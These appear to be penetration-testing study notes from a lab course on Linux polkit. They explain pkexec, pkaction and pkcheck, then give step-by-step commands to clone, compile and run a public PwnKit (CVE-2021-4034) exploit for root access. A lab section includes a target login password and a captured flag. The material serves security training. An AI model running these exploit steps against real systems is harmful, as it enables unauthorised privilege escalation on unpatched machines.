# Polkit

PolicyKit (polkit) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so.

Polkit works with two groups of files.

1. actions/policies (/usr/share/polkit-1/actions)
2. rules (/usr/share/polkit-1/rules.d)

Custom rules can be placed in the directory /etc/polkit-1/localauthority/50-local.d with the file extension .pkla

PolKit also comes with three additional programs:

pkexec - runs a program with the rights of another user or with root rights
pkaction - can be used to display actions
pkcheck - this can be used to check if a process is authorized for a specific action

pkexec -u root id
uid=0(root) gid=0(root) groups=0(root)

## Vulnerability : Pwnkit

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034

git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

```
./poc

# id
uid=0(root) gid=0(root) groups=0(root)
```

## LAB

ssh htb-student@10.129.205.113
HTB_@cademy_stdnt!

git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

scp poc htb-student@10.129.205.113:/home/htb-student/

./poc
cat /root/flag.txt
HTB{p0Lk1tt3n}
